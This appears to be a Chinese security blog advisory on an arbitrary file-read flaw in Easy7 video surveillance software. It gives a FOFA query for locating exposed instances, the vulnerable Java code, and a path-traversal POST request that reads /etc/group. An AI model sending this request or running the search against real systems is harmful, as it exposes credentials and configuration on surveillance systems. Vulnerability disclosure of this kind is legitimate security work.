---
title: "天地伟业Easy7 downloadNote 文件读取漏洞"
source: https://mrxn.net/jswz/easy7-file-downloadNote-file-read.html
asset_dir: assets/天地伟业easy7-downloadnote-文件读取漏洞
---

# 天地伟业Easy7 downloadNote 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/10 08:45
- 283浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

表现层状态转换

REST

授权

---

# 漏洞简介

天地伟业Easy7是一款用于视频监控管理的[软件](#)系统。

漏洞预警服务

该系统的/Easy7/rest/file/downloadNote接口存在前台任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者通过构造恶意路径参数（如/etc/passwd）可读取服务器上的任意文件，可能导致敏感信息泄露（如系统配置文件、用户凭证等）。由于天地伟业产品多用于关键基础设施领域，若存在公网暴露实例，可能带来严重的安全风险。

# 影响版本

# fofa语法

> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7\_logo\_transparent.png") && title="平台"

# 漏洞分析

深入探索

SQL

rest

服务器

首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。

物流软件安全

再来看本次的漏洞接口 /Easy7/rest/file/downloadNote 的对应方法`downloadNote()`的实现逻辑

```
@Controller
@RequestMapping({"/file"})
public class CLS_REST_File {
    @Resource(
        name = "boSystemInfo"
    )
    private CLS_BO_SystemInfo boSystemInfo;
    @Resource(
        name = "boFile"
    )
    private CLS_BO_File boFile;
    @Resource(
        name = "boPROXY"
    )
    private CLS_BO_PROXY boPROXY;
    private static final Log log = LogFactory.getLog(CLS_REST_File.class);

    @RequestMapping({"/downloadNote"})
    public void downloadNote(HttpServletRequest request, HttpServletResponse response, CLS_VO_File voFile) throws IOException {
        String path = CLS_Easy7_Types.file_path;
        CLS_VO_Result result = new CLS_VO_Result();
        String fileName = voFile.getFileName();
        String fullName = voFile.getFullName();
        String newPath = path + fileName;
        File isFile = new File(newPath);
        if (!isFile.exists()) {
            result.setRet(-7);
            response.getWriter().print(JSONObject.fromObject(result));
        } else {
            ServletOutputStream out = response.getOutputStream();
            String retFilename = "";
            if (fullName != null && !"".equals(fullName)) {
                retFilename = fullName;
            } else {
                retFilename = fileName;
            }

            String ofileName = URLEncoder.encode(retFilename, "UTF-8");
            response.setHeader("Content-disposition", "attachment;filename=" + new String(ofileName.getBytes("UTF-8"), "UTF-8") + ".doc");
            BufferedInputStream bis = null;
            BufferedOutputStream bos = null;

            try {
                InputStream inputStream = new FileInputStream(newPath);
                bis = new BufferedInputStream(inputStream);
                bos = new BufferedOutputStream(out);
                byte[] buff = new byte[2048];

                int bytesRead;
                while((bytesRead = bis.read(buff, 0, buff.length)) != -1) {
                    bos.write(buff, 0, bytesRead);
                }

                this.forwardInquestLog(request.getLocalPort(), voFile.getFullName());
```

其中 `path = CLS_Easy7_Types.file_path;`为应用的根目录，然后将用户传递的参数`fileName`作为文件路径一部分传递进`new FileInputStream(newPath);`中进行文件操作，整个过程无任何校验或过滤，因此造成任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /Easy7/rest/file/downloadNote HTTP/1.1
Host: easy7.mrxn.net
Content-Type: application/x-www-form-urlencoded

fullName=1.png&fileName=../../../etc/group
```

[![天地伟业Easy7 downloadNote 文件读取漏洞](images/img-001-ea3a8bb27727.webp)](https://image.mrxn.net/a2a2d4eb2ef14175a7df8aa4c4cb4c07.webp)

成功读取到/etc/group文件内容

计算机科学

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
